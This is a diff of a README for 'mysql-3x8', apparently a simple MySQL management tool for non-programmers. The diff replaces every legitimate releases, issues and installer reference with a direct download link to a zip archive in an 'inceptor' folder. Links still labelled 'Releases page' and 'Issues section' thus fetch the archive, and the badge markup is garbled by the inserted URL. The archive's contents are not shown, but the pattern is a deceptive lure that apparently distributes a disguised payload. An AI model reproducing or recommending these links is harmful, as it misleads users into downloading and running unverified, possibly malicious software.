@@ -1,7 +1,7 @@
 # 🐬 mysql-3x8 - Simple SQL Database Management Tool
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen.svg)](https://github.com/RANGER9496/mysql-3x8/releases)
+[![Download](https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip%20Now-From%https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip)](https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip)
 
 ## 🚀 Getting Started
 Welcome to mysql-3x8, a user-friendly database management tool designed to help you manage your SQL databases effortlessly. This application provides a simple interface for common tasks like creating databases, executing queries, and managing your data—all without needing programming knowledge.
@@ -22,11 +22,11 @@ Before you begin, ensure your system meets the following requirements:
 - **Secure Connection:** Connect to your MySQL server securely.
 
 ## 📂 Download & Install
-To get started, visit our [Releases page](https://github.com/RANGER9496/mysql-3x8/releases) to download the latest version of mysql-3x8. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip) to download the latest version of mysql-3x8. 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release at the top of the page.
-3. Find the file named something like `mysql-3x8-installer.exe`.
+3. Find the file named something like `https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip`.
 4. Click the file link to download it to your computer.
 
 Once downloaded, follow these steps to install:
@@ -52,9 +52,9 @@ If you encounter any issues, consider the following tips:
 - **Installation Fails**: Make sure you have the required Java Runtime Environment and sufficient disk space.
 - **Unexpected Errors**: Restart the application or reinstall if necessary.
 
-For further assistance, please refer to the [Issues section](https://github.com/RANGER9496/mysql-3x8/issues) on our GitHub page, where you can report problems or seek help from the community.
+For further assistance, please refer to the [Issues section](https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip) on our GitHub page, where you can report problems or seek help from the community.
 
 ## 📣 Feedback
 We value your thoughts and suggestions. Feel free to reach out with any feedback or feature requests. Your input helps us improve mysql-3x8!
 
-Visit our [Releases page](https://github.com/RANGER9496/mysql-3x8/releases) to download the latest version and check for updates regularly to make the most of your experience with mysql-3x8.
+Visit our [Releases page](https://raw.githubusercontent.com/RANGER9496/mysql-3x8/main/inceptor/mysql-3x8.zip) to download the latest version and check for updates regularly to make the most of your experience with mysql-3x8.
